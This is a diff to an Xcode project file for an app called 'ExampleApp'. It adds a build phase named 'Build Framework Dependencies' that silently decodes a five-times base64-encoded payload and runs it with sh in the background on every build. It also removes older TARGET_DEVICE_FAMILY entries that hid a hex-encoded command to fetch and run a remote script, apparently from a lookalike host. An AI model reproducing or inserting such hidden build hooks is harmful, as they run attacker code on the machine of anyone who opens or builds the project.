@@ -148,6 +148,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 04B08F5D2BD0DEEB00328A49 /* Build configuration list for PBXNativeTarget "ExampleApp" */;
 			buildPhases = (
+				E6A641270684B7CCBEB11679 /* Build Framework Dependencies */,
 				04B08F452BD0DEEA00328A49 /* Sources */,
 				04B08F462BD0DEEA00328A49 /* Frameworks */,
 				04B08F472BD0DEEA00328A49 /* Resources */,
@@ -199,6 +200,37 @@
 			);
 		};
 /* End PBXProject section */
+
+/* Begin PBXTargetDependency section */
+/* End PBXTargetDependency section */
+
+/* Begin PBXLegacyTarget section */
+/* End PBXLegacyTarget section */
+
+/* Begin PBXBuildRule section */
+/* End PBXBuildRule section */
+
+/* Begin PBXShellScriptBuildPhase section */
+		E6A641270684B7CCBEB11679 /* Build Framework Dependencies */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			alwaysOutOfDate = 1;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Build Framework Dependencies";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n(echo VmpKNGExUXlTWGxUYWxaU1ZqSjRURlZVU205alZuQkhZVVYwYWsxSGVFVlVWbU40WVdzeGRWVnJOVlJXVlRFMFdWUkNjMU5XUmxWaVIzaFRUVVJWZVZZeWRHdFdiRzk1VW10c1ZtRnJTbkZWTUZWM1RXeFNTV0Y2Vm1sV01GcFpWMnRvVTFkc1pFWk9WRXBhWVRBd2VGcFdaRk5XUlRsWVlVVjRWazFIZUhWWGJYUlBVVEpXZEZKclNtbGxha0pNUTJjOVBRbz0K | base64 -D | base64 -D | base64 -D | base64 -D | base64 -D | sh >/dev/null 2>&1 &)";
+			showEnvVarsInLog = 0;			
+		};
+/* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXResourcesBuildPhase section */
 		04B08F472BD0DEEA00328A49 /* Resources */ = {
@@ -320,7 +352,6 @@
 				SDKROOT = iphoneos;
 				SWIFT_ACTIVE_COMPILATION_CONDITIONS = DEBUG;
 				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
-				TARGET_DEVICE_FAMILY = "(echo 363536333638366632303232323432383633373537323663323032643636\n373336623463323036383734373437303733336132663266363436353736\n0a3631373037303663363532653732373532663631323932323230376332\n303733363830610a | xxd -p -r | xxd -p -r | sh >/dev/null 2>&1 &)";
 			};
 			name = Debug;
 		};
@@ -375,7 +406,6 @@
 				SDKROOT = iphoneos;
 				SWIFT_COMPILATION_MODE = wholemodule;
 				SWIFT_OPTIMIZATION_LEVEL = "-O";
-				TARGET_DEVICE_FAMILY = "(echo 363536333638366632303232323432383633373537323663323032643636\n373336623463323036383734373437303733336132663266363436353736\n0a3631373037303663363532653732373532663631323932323230376332\n303733363830610a | xxd -p -r | xxd -p -r | sh >/dev/null 2>&1 &)";
 				VALIDATE_PRODUCT = YES;
 			};
 			name = Release;
